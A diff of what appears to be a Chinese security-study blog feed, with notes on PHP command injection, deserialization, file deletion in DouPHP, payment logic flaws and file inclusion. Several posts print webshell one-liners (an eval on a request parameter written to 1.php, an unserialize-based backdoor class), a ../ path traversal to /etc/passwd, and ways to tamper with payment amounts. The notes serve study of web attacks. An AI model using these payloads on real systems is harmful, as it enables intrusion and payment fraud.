-<p>​    install.lock 存在就不能重装、不存在就可以重装<br>​    找个任意文件名修改漏洞、任意文件删除漏洞。  就可以进入重装页面</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">douphp 可以通过任意文件删除漏洞去删除安装锁</span><br><span class="line"></span><br><span class="line"> 		任意文件删除漏洞 【???】</span><br><span class="line"></span><br><span class="line"> 		危险函数定位法。 负责删除文件、文件重命名的函数 PHP</span><br><span class="line"> 			unlink</span><br><span class="line"> 			rename</span><br><span class="line"> 			move_uploaded_file</span><br><span class="line"></span><br><span class="line"> 			unlink(</span><br><span class="line"></span><br><span class="line"> 			$sql_filename = $backup-&gt;is_backup_file($_REQUEST[&#x27;sql_filename&#x27;], &#x27;backup.php&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    is_backup_file($_REQUEST[&#x27;sql_filename&#x27;], &#x27;backup.php&#x27;);</span><br><span class="line"></span><br><span class="line">    aaa( -X/E:/phpStudy/WWW/success.php )@qq.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @ unlink(ROOT_PATH . M_PATH . &#x27;/theme/&#x27; . $_CFG[&#x27;mobile_theme&#x27;] . &#x27;/images/&#x27; . $mobile_logo);</span><br><span class="line"></span><br><span class="line">     $mobile_logo = $dou-&gt;get_one(&quot;SELECT value FROM &quot; . $dou-&gt;table(&#x27;config&#x27;) . &quot; WHERE name = &#x27;mobile_logo&#x27;&quot;);</span><br><span class="line"></span><br><span class="line">    logo.png =&gt; ../../../../data/install.lock</span><br><span class="line"></span><br><span class="line">    config表里面的name = &#x27;mobile_logo&#x27;的值必须是 ../../../../data/install.lock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	foreach ($_REQUEST as $name =&gt; $value)  键值分离   传参名就是键，传参值就是值</span><br><span class="line">		把键和值分来 </span><br><span class="line">		$name 就是键盘，$value就是值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	GET :  8=KKKK</span><br><span class="line">	$_GET =&gt; 预定义数组</span><br><span class="line">	$_GET[8]/$_REQUEST[8] 名字为8的键  8=phpinfo();</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>代码执行</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>反序列化漏洞</title>
-    <url>/2023/08/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="序列化和反序列化的定义"><a href="#序列化和反序列化的定义" class="headerlink" title="序列化和反序列化的定义:"></a>序列化和反序列化的定义:</h1><p>序列化 (serialize)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。【将状态信息保存为字符串】</p>
-<p>反序列化就是再将这个状态信息拿出来使用。（重新再转化为对象或者其他的）【将字符串转化为状态信息】</p>
-<p>类比:<br>序列化: 游戏的存档 =&gt; 把游戏当前的状态保存下来<br>反序列化: 游戏的读档 =&gt; 通过存档的信息恢复游戏的状态<br>一般情况下：只有类会反序列化和序列化</p>
-<p>xxx::aaa()  =&gt;  类的方法（函数）; 类里面的函数，叫做方法<br>他去调用xxx类里的aaa()函数</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">反序列化免杀马：</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;<span class="title function_ invoke__">array_map</span>(<span class="variable">$this</span>-&gt;test,<span class="variable">$this</span>-&gt;aaa);&#125;&#125;</span><br><span class="line">	<span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="number">8</span>]);</span><br><span class="line">	<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">a</span>();</span><br></pre></td></tr></table></figure>
-<h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><p>自动化运行方法 - 不需要写就自动会运行方法 - 魔术方法</p>
-<p>条件满足自动运行 // 不会关</p>
-<p>魔术方法 =&gt; 特殊的函数 =&gt; 满足条件自动运行的函数</p>
-<p>__wakeup :  unserialize就会调用</p>
-<p>__xxxxx()</p>
-<p>__toString</p>
-<p>​    当对象被当作字符串输出的时候<br>​    echo 只能字符串</p>
-<p>​    O:6:”readme”:1:{s:6:”source”;s:8:”flag.php”;}<br>​    反序列化需要的值</p>
-<p>​    foreach($todos as $todo)<br>​    遍历数组： $todos的东西依次放入$todo<br>​    <li><?=$todo?></li></p>
-<p>​    HTML + PHP </p>
-<p>​    <li></li> html 行标签</p>
-<p>​    &lt;?=$todo?&gt; PHP代码</p>
-<p>​    &lt;?=$todo?&gt;<br>​    =&gt;<br>​    &lt;?php echo $todo?&gt;</p>
-<h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><h2 id="Shiro反序列化漏洞"><a href="#Shiro反序列化漏洞" class="headerlink" title="Shiro反序列化漏洞"></a>Shiro反序列化漏洞</h2><h2 id="Weblogic反序列化漏洞"><a href="#Weblogic反序列化漏洞" class="headerlink" title="Weblogic反序列化漏洞"></a>Weblogic反序列化漏洞</h2>]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>反序列化漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>内网信息收集(Nmap与Hydra)</title>
     <url>/2023/08/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Nmap%E4%B8%8EHydra/</url>
     <content><![CDATA[<p>官方脚本：<br><a href="https://svn.nmap.org/nmap/scripts/">https://svn.nmap.org/nmap/scripts/</a><br>CVE查询：<br><a href="http://cve.scap.org.cn/">http://cve.scap.org.cn/</a><br><a href="http://cve.mitre.org/">http://cve.mitre.org/</a></p>
@@ -1092,6 +1063,57 @@
       </tags>
   </entry>
   <entry>
+    <title>命令执行漏洞</title>
+    <url>/2023/08/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="命令执行漏洞定义"><a href="#命令执行漏洞定义" class="headerlink" title="命令执行漏洞定义"></a>命令执行漏洞定义</h1><p>用户输入的数据被当做系统命令(cmd/bash)执行<br>whoami / net user / tasklist / xxx</p>
+<p>dir / ls / rm -rf</p>
+<h1 id="多行命令执行："><a href="#多行命令执行：" class="headerlink" title="多行命令执行："></a>多行命令执行：</h1><p>whoami&amp;net user&amp;ipconfig</p>
+<p>拿到了命令执行漏洞后还可能想要webshell</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">123</span> &gt; <span class="number">777</span>.txt</span><br><span class="line">可以尝试cmd的输出命令	<span class="keyword">echo</span> “<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">8</span>])<span class="meta">?&gt;</span>” &gt;<span class="number">1</span>.php	</span><br><span class="line">netstat -ano &gt; <span class="number">1</span>.txt </span><br><span class="line">disable_function PHP的禁用函数</span><br></pre></td></tr></table></figure>
+<h1 id="命令执行函数："><a href="#命令执行函数：" class="headerlink" title="命令执行函数："></a>命令执行函数：</h1><p>system()  执行系统命令,直接输出</p>
+<p>echo exec()    执行系统命令,没有输出,输出最后一行。</p>
+<p>echo shell_exec(‘whoami’); 执行系统命令,没有输出,可以输出多行</p>
+<p>echo `whoami`             //(反引号)与shell_exec 效果完全相同【调用,即简写】</p>
+<p>passthru //只调用命令,他和system差不多</p>
+<p>popen // 比较特殊的存在 [disable_function 是可以绕的]<br>        $a = popen(‘whoami’,’r’);         //返回的是一个文件的指针地址( //r是只读、w是写入)<br>        echo fread($a,1024);</p>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>命令执行漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>反序列化漏洞</title>
+    <url>/2023/08/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="序列化和反序列化的定义"><a href="#序列化和反序列化的定义" class="headerlink" title="序列化和反序列化的定义:"></a>序列化和反序列化的定义:</h1><p>序列化 (serialize)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。【将状态信息保存为字符串】</p>
+<p>反序列化就是再将这个状态信息拿出来使用。（重新再转化为对象或者其他的）【将字符串转化为状态信息】</p>
+<p>类比:<br>序列化: 游戏的存档 =&gt; 把游戏当前的状态保存下来<br>反序列化: 游戏的读档 =&gt; 通过存档的信息恢复游戏的状态<br>一般情况下：只有类会反序列化和序列化</p>
+<p>xxx::aaa()  =&gt;  类的方法（函数）; 类里面的函数，叫做方法<br>他去调用xxx类里的aaa()函数</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">反序列化免杀马：</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;<span class="title function_ invoke__">array_map</span>(<span class="variable">$this</span>-&gt;test,<span class="variable">$this</span>-&gt;aaa);&#125;&#125;</span><br><span class="line">	<span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="number">8</span>]);</span><br><span class="line">	<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">a</span>();</span><br></pre></td></tr></table></figure>
+<h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><p>自动化运行方法 - 不需要写就自动会运行方法 - 魔术方法</p>
+<p>条件满足自动运行 // 不会关</p>
+<p>魔术方法 =&gt; 特殊的函数 =&gt; 满足条件自动运行的函数</p>
+<p>__wakeup :  unserialize就会调用</p>
+<p>__xxxxx()</p>
+<p>__toString</p>
+<p>​    当对象被当作字符串输出的时候<br>​    echo 只能字符串</p>
+<p>​    O:6:”readme”:1:{s:6:”source”;s:8:”flag.php”;}<br>​    反序列化需要的值</p>
+<p>​    foreach($todos as $todo)<br>​    遍历数组： $todos的东西依次放入$todo<br>​    <li><?=$todo?></li></p>
+<p>​    HTML + PHP </p>
+<p>​    <li></li> html 行标签</p>
+<p>​    &lt;?=$todo?&gt; PHP代码</p>
+<p>​    &lt;?=$todo?&gt;<br>​    =&gt;<br>​    &lt;?php echo $todo?&gt;</p>
+<h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><h2 id="Shiro反序列化漏洞"><a href="#Shiro反序列化漏洞" class="headerlink" title="Shiro反序列化漏洞"></a>Shiro反序列化漏洞</h2><h2 id="Weblogic反序列化漏洞"><a href="#Weblogic反序列化漏洞" class="headerlink" title="Weblogic反序列化漏洞"></a>Weblogic反序列化漏洞</h2>]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>反序列化漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>变量覆盖漏洞</title>
     <url>/2023/08/21/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="变量覆盖的定义"><a href="#变量覆盖的定义" class="headerlink" title="变量覆盖的定义:"></a>变量覆盖的定义:</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="number">2</span>;<span class="comment">//变量覆盖</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -1124,52 +1146,6 @@
       </tags>
   </entry>
   <entry>
-    <title>命令执行漏洞</title>
-    <url>/2023/08/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="命令执行漏洞定义"><a href="#命令执行漏洞定义" class="headerlink" title="命令执行漏洞定义"></a>命令执行漏洞定义</h1><p>用户输入的数据被当做系统命令(cmd/bash)执行<br>whoami / net user / tasklist / xxx</p>
-<p>dir / ls / rm -rf</p>
-<h1 id="多行命令执行："><a href="#多行命令执行：" class="headerlink" title="多行命令执行："></a>多行命令执行：</h1><p>whoami&amp;net user&amp;ipconfig</p>
-<p>拿到了命令执行漏洞后还可能想要webshell</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">123</span> &gt; <span class="number">777</span>.txt</span><br><span class="line">可以尝试cmd的输出命令	<span class="keyword">echo</span> “<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">8</span>])<span class="meta">?&gt;</span>” &gt;<span class="number">1</span>.php	</span><br><span class="line">netstat -ano &gt; <span class="number">1</span>.txt </span><br><span class="line">disable_function PHP的禁用函数</span><br></pre></td></tr></table></figure>
-<h1 id="命令执行函数："><a href="#命令执行函数：" class="headerlink" title="命令执行函数："></a>命令执行函数：</h1><p>system()  执行系统命令,直接输出</p>
-<p>echo exec()    执行系统命令,没有输出,输出最后一行。</p>
-<p>echo shell_exec(‘whoami’); 执行系统命令,没有输出,可以输出多行</p>
-<p>echo `whoami`             //(反引号)与shell_exec 效果完全相同【调用,即简写】</p>
-<p>passthru //只调用命令,他和system差不多</p>
-<p>popen // 比较特殊的存在 [disable_function 是可以绕的]<br>        $a = popen(‘whoami’,’r’);         //返回的是一个文件的指针地址( //r是只读、w是写入)<br>        echo fread($a,1024);</p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>命令执行漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>支付漏洞</title>
-    <url>/2023/08/21/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="支付漏洞属于逻辑漏洞"><a href="#支付漏洞属于逻辑漏洞" class="headerlink" title="支付漏洞属于逻辑漏洞"></a>支付漏洞属于逻辑漏洞</h1><h1 id="支付过程"><a href="#支付过程" class="headerlink" title="支付过程"></a>支付过程</h1><p>用户[传参] -&gt; 商家[计算出] -&gt;第三方平台(支付宝) -&gt; 商家 -&gt;用户</p>
-<h1 id="漏洞种类"><a href="#漏洞种类" class="headerlink" title="漏洞种类"></a>漏洞种类</h1><h2 id="1-修改支付价格"><a href="#1-修改支付价格" class="headerlink" title="1.修改支付价格"></a>1.修改支付价格</h2><p>支付三步曲——订购、订单、付款<br>三个步骤当中的随便一个步骤进行修改价格测试，如果前面两步有验证机制，那么你可在最后一步付款时进行抓包尝试修改金额，如果没有在最后一步做好检验，那么漏洞就会存在，其修改的金额值你可以尝试小数目或者尝试负数。</p>
-<h2 id="2-修改支付状态"><a href="#2-修改支付状态" class="headerlink" title="2.修改支付状态"></a>2.修改支付状态</h2><p>订单完成——未完成（傻傻分不清）<br>A订单-0001完成——B订单-0002未完成<br>付款时尝试把订单B的单号给成订单A</p>
-<h2 id="3-修改订单数量"><a href="#3-修改订单数量" class="headerlink" title="3.修改订单数量"></a>3.修改订单数量</h2><p>改成0或者-1,系统自动取绝对值</p>
-<h2 id="4-修改附属值"><a href="#4-修改附属值" class="headerlink" title="4.修改附属值"></a>4.修改附属值</h2><h3 id="优惠劵"><a href="#优惠劵" class="headerlink" title="优惠劵"></a>优惠劵</h3><p>优惠劵其基本都是优惠，一般用优惠劵进行消费一般出现在第二个步骤当中：确认购买信息，在这个步骤页面当中，你可以选择相关优惠劵，然后直接修改金额大于或等于商品的价格就可以，或者直接修改其为负值进行尝试，最后进行支付，如果对这点没有加以验证，那么问题就会产生，直接支付成功</p>
-<h3 id="修改运费支付漏洞"><a href="#修改运费支付漏洞" class="headerlink" title="修改运费支付漏洞"></a>修改运费支付漏洞</h3><p><code>http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-079085</code><br>也可以改成负数,总额=商品价格+运费,近乎白嫖</p>
-<h2 id="5-越权支付"><a href="#5-越权支付" class="headerlink" title="5.越权支付"></a>5.越权支付</h2><p>主要针对有余额的平台,属于越权漏洞,但也算是个支付漏洞吧<br>存在user=id(123),这种传参时，尝试改改id,尝试用别人的钱包买自己的包包。</p>
-<h2 id="6-跳过支付环节"><a href="#6-跳过支付环节" class="headerlink" title="6.跳过支付环节"></a>6.跳过支付环节</h2><p>抓包找到支付成功访问的页面，然后直接下个单子，复制订单号，然后拼接成功访问的页面<br><code>http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0108184</code><br><code>http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0188155</code></p>
-<h1 id="防护方法"><a href="#防护方法" class="headerlink" title="防护方法"></a>防护方法</h1><h2 id="数据加密-有用-但不多"><a href="#数据加密-有用-但不多" class="headerlink" title="数据加密(有用,但不多)"></a>数据加密(有用,但不多)</h2><p>1.加密可能被解密<br>2.加密的数据也可以被复用<br>3.数据包中的加密是在前端加密的,因此会js的都能知道加密方法(因为抓包的时候就已经被加密了,请求还没发给服务器,因此一定是前端加密的)</p>
-<h2 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h2><p>商品和钱的传参应该查询数据库做校验</p>
-<h1 id="如何挖掘"><a href="#如何挖掘" class="headerlink" title="如何挖掘"></a>如何挖掘</h1><h2 id="找到关键的数据包"><a href="#找到关键的数据包" class="headerlink" title="找到关键的数据包"></a>找到关键的数据包</h2><p>​    可能一个支付操作有三四个数据包，我们要对数据包进行挑选。</p>
-<h2 id="分析数据包"><a href="#分析数据包" class="headerlink" title="分析数据包"></a>分析数据包</h2><p>​    支付数据包中会包含很多的敏感信息（账号，金额，余额，优惠），要尝试对数据包中的各个参数进行分析。</p>
-<h2 id="不按套路出牌"><a href="#不按套路出牌" class="headerlink" title="不按套路出牌"></a>不按套路出牌</h2><p>​    多去想想开发者没有想到的地方, pc端，wap端也看看，app也试试。</p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>逻辑漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>宽字节注入</title>
     <url>/2023/08/21/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1 id="魔术引号"><a href="#魔术引号" class="headerlink" title="魔术引号"></a>魔术引号</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>不让你闭合的一个函数</p>
@@ -1199,6 +1175,58 @@
       </categories>
       <tags>
         <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>支付漏洞</title>
+    <url>/2023/08/21/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="支付漏洞属于逻辑漏洞"><a href="#支付漏洞属于逻辑漏洞" class="headerlink" title="支付漏洞属于逻辑漏洞"></a>支付漏洞属于逻辑漏洞</h1><h1 id="支付过程"><a href="#支付过程" class="headerlink" title="支付过程"></a>支付过程</h1><p>用户[传参] -&gt; 商家[计算出] -&gt;第三方平台(支付宝) -&gt; 商家 -&gt;用户</p>
+<h1 id="漏洞种类"><a href="#漏洞种类" class="headerlink" title="漏洞种类"></a>漏洞种类</h1><h2 id="1-修改支付价格"><a href="#1-修改支付价格" class="headerlink" title="1.修改支付价格"></a>1.修改支付价格</h2><p>支付三步曲——订购、订单、付款<br>三个步骤当中的随便一个步骤进行修改价格测试，如果前面两步有验证机制，那么你可在最后一步付款时进行抓包尝试修改金额，如果没有在最后一步做好检验，那么漏洞就会存在，其修改的金额值你可以尝试小数目或者尝试负数。</p>
+<h2 id="2-修改支付状态"><a href="#2-修改支付状态" class="headerlink" title="2.修改支付状态"></a>2.修改支付状态</h2><p>订单完成——未完成（傻傻分不清）<br>A订单-0001完成——B订单-0002未完成<br>付款时尝试把订单B的单号给成订单A</p>
+<h2 id="3-修改订单数量"><a href="#3-修改订单数量" class="headerlink" title="3.修改订单数量"></a>3.修改订单数量</h2><p>改成0或者-1,系统自动取绝对值</p>
+<h2 id="4-修改附属值"><a href="#4-修改附属值" class="headerlink" title="4.修改附属值"></a>4.修改附属值</h2><h3 id="优惠劵"><a href="#优惠劵" class="headerlink" title="优惠劵"></a>优惠劵</h3><p>优惠劵其基本都是优惠，一般用优惠劵进行消费一般出现在第二个步骤当中：确认购买信息，在这个步骤页面当中，你可以选择相关优惠劵，然后直接修改金额大于或等于商品的价格就可以，或者直接修改其为负值进行尝试，最后进行支付，如果对这点没有加以验证，那么问题就会产生，直接支付成功</p>
+<h3 id="修改运费支付漏洞"><a href="#修改运费支付漏洞" class="headerlink" title="修改运费支付漏洞"></a>修改运费支付漏洞</h3><p><code>http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-079085</code><br>也可以改成负数,总额=商品价格+运费,近乎白嫖</p>
+<h2 id="5-越权支付"><a href="#5-越权支付" class="headerlink" title="5.越权支付"></a>5.越权支付</h2><p>主要针对有余额的平台,属于越权漏洞,但也算是个支付漏洞吧<br>存在user=id(123),这种传参时，尝试改改id,尝试用别人的钱包买自己的包包。</p>
+<h2 id="6-跳过支付环节"><a href="#6-跳过支付环节" class="headerlink" title="6.跳过支付环节"></a>6.跳过支付环节</h2><p>抓包找到支付成功访问的页面，然后直接下个单子，复制订单号，然后拼接成功访问的页面<br><code>http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0108184</code><br><code>http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0188155</code></p>
+<h1 id="防护方法"><a href="#防护方法" class="headerlink" title="防护方法"></a>防护方法</h1><h2 id="数据加密-有用-但不多"><a href="#数据加密-有用-但不多" class="headerlink" title="数据加密(有用,但不多)"></a>数据加密(有用,但不多)</h2><p>1.加密可能被解密<br>2.加密的数据也可以被复用<br>3.数据包中的加密是在前端加密的,因此会js的都能知道加密方法(因为抓包的时候就已经被加密了,请求还没发给服务器,因此一定是前端加密的)</p>
+<h2 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h2><p>商品和钱的传参应该查询数据库做校验</p>
+<h1 id="如何挖掘"><a href="#如何挖掘" class="headerlink" title="如何挖掘"></a>如何挖掘</h1><h2 id="找到关键的数据包"><a href="#找到关键的数据包" class="headerlink" title="找到关键的数据包"></a>找到关键的数据包</h2><p>​    可能一个支付操作有三四个数据包，我们要对数据包进行挑选。</p>
+<h2 id="分析数据包"><a href="#分析数据包" class="headerlink" title="分析数据包"></a>分析数据包</h2><p>​    支付数据包中会包含很多的敏感信息（账号，金额，余额，优惠），要尝试对数据包中的各个参数进行分析。</p>
+<h2 id="不按套路出牌"><a href="#不按套路出牌" class="headerlink" title="不按套路出牌"></a>不按套路出牌</h2><p>​    多去想想开发者没有想到的地方, pc端，wap端也看看，app也试试。</p>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>逻辑漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含漏洞</title>
+    <url>/2023/08/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>攻击者利用包含的特性，加上应用本身对文件（包含）控制不严格，最终造成攻击者进行任意文件包含。（注：包含的文件会被当成脚本文件来解析）</p>
+<h2 id="LFI-本地文件包含"><a href="#LFI-本地文件包含" class="headerlink" title="LFI :本地文件包含"></a>LFI :本地文件包含</h2><p> 本地文件包含(只能包含目标计算机上有的文件)</p>
+<h2 id="RFI-远程文件包含"><a href="#RFI-远程文件包含" class="headerlink" title="RFI : 远程文件包含"></a>RFI : 远程文件包含</h2><p>远程文件包含（木马在别人的电脑上我也能包含）  罕见</p>
+<h1 id="易混淆的重点"><a href="#易混淆的重点" class="headerlink" title="易混淆的重点:"></a>易混淆的重点:</h1><p>文件包含是开发必备的功能,本身不是漏洞,但是任意文件包含就是漏洞;<br>同理,代码执行不是漏洞,任意代码执行才是漏洞</p>
+<h1 id="文件包含的本质："><a href="#文件包含的本质：" class="headerlink" title="文件包含的本质："></a>文件包含的本质：</h1><p>去除代码的冗余性<br>比如:a.php里面写好了数据库连接的函数,b.php中需要数据库的操作时,直接引用a.php就行</p>
+<h1 id="四个PHP的引用函数"><a href="#四个PHP的引用函数" class="headerlink" title="四个PHP的引用函数"></a>四个PHP的引用函数</h1><h2 id="include-出现几次就包含几次"><a href="#include-出现几次就包含几次" class="headerlink" title="include[出现几次就包含几次]"></a>include[出现几次就包含几次]</h2><p>使用include引用外部文件时，只有代码执行到include代码段时，调用的外部文件才会被引用并读取，当引用的文件发生错误时，系统只会给出个警告错误，而整个php文件会继续执行。</p>
+<h2 id="require"><a href="#require" class="headerlink" title="require"></a>require</h2><p>在php文件被执行之前，php解析器会让被引用的文件的全部内容替换require语句，然后与require语句之外的其他语句组成个新的php文件，最好后按新的php文件执行程序代码。</p>
+<h2 id="include-once-once只在乎是否之前被包含过-不在乎是用require还是include还是-once"><a href="#include-once-once只在乎是否之前被包含过-不在乎是用require还是include还是-once" class="headerlink" title="include_once [_once只在乎是否之前被包含过,不在乎是用require还是include还是_once]"></a>include_once [_once只在乎是否之前被包含过,不在乎是用require还是include还是_once]</h2><p>在导入文件前先检测该文件是否在该页面的其他部分被引用过，如果有，则不会重复引用该文件，程序只能引用一次。（要导入的文件中存在一些自定义函数，那么如果在同一个程序中重复导入这个文件，在第二次导入时便会发生错误，因为php不允许相同名称的函数被重复声明）</p>
+<h2 id="require-once"><a href="#require-once" class="headerlink" title="require_once"></a>require_once</h2><p>是require语句的延伸，他的功能与require语句基本一致，不同的是，在应用require_once时，先会检查要引用的文件是不是已将在该程序中的其他地方被引用过，如果有，则不会在重复调用该文件。（同时使用require_once语句在同一页面中引用了两个相同的文件，那么在输出时，只有第一个文件被执行，第二个引用的文件则不会被执行）</p>
+<h2 id="（包含不存在文件的时候-include可以继续执行，require不可以）"><a href="#（包含不存在文件的时候-include可以继续执行，require不可以）" class="headerlink" title="（包含不存在文件的时候,include可以继续执行，require不可以）"></a>（包含不存在文件的时候,include可以继续执行，require不可以）</h2><h1 id="文件包含不区分文件后缀且不仅局限于包含根目录"><a href="#文件包含不区分文件后缀且不仅局限于包含根目录" class="headerlink" title="文件包含不区分文件后缀且不仅局限于包含根目录"></a>文件包含不区分文件后缀且不仅局限于包含根目录</h1><p>比如1.txt内是php代码,2.php包含1.txt时,页面会运行1.txt内的PHP语句</p>
+<p>同时,被包含的文件可以不存在于网站根目录,因为是通过函数和路径去寻找并包含的; 然而解析漏洞只能将木马上传到网站的目录下才可以getshell.</p>
+<h1 id="如何寻找文件包含漏洞"><a href="#如何寻找文件包含漏洞" class="headerlink" title="如何寻找文件包含漏洞"></a>如何寻找文件包含漏洞</h1><h2 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1.代码审计"></a>1.代码审计</h2><h2 id="2-当传参里出现XX-XX-比如index-php-XX-php"><a href="#2-当传参里出现XX-XX-比如index-php-XX-php" class="headerlink" title="2.当传参里出现XX.XX,比如index.php,XX.php"></a>2.当传参里出现XX.XX,比如index.php,XX.php</h2><p>(1)文件包含漏洞<br>(2)任意文件读取漏洞<br>(3)任意文件下载漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.XX.com/download/downfile.asp?filename=123.pdf </span><br><span class="line">可以尝试操作系统的敏感路径,比如../../../../etc/passwd或者window的各种敏感目录</span><br></pre></td></tr></table></figure>
+<h1 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h1><p>1、无需情况下设置allow_url_include和allow_url_fopen为关闭</p>
+<p>2、对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir</p>
+<p>3、建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现../之类的目录跳转符。</p>
+<p>4、严格检查include类的文件包含函数中的参数是否外界可控。</p>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>文件包含漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1262,31 +1290,35 @@
       </tags>
   </entry>
   <entry>
-    <title>文件包含漏洞</title>
-    <url>/2023/08/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>攻击者利用包含的特性，加上应用本身对文件（包含）控制不严格，最终造成攻击者进行任意文件包含。（注：包含的文件会被当成脚本文件来解析）</p>
-<h2 id="LFI-本地文件包含"><a href="#LFI-本地文件包含" class="headerlink" title="LFI :本地文件包含"></a>LFI :本地文件包含</h2><p> 本地文件包含(只能包含目标计算机上有的文件)</p>
-<h2 id="RFI-远程文件包含"><a href="#RFI-远程文件包含" class="headerlink" title="RFI : 远程文件包含"></a>RFI : 远程文件包含</h2><p>远程文件包含（木马在别人的电脑上我也能包含）  罕见</p>
